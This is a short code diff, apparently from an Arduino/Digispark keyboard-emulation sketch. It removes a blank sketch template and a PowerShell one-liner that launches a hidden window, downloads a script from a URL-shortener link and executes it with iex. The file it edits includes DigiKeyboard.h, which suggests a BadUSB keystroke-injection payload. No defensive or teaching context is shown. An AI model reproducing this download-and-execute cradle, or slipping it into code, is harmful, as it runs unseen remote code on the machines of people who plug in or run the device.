@@ -1,13 +1,3 @@
-void setup() {
-  // put your setup code here, to run once:
-
-}
-
-void loop() {
-  // put your main code here, to run repeatedly:
-
-}
-Start-Process powershell -ArgumentList "-w h -c iex(iwr https://rb.gy/pnj5gn)"
 #include "DigiKeyboard.h"
 
 void setup() {
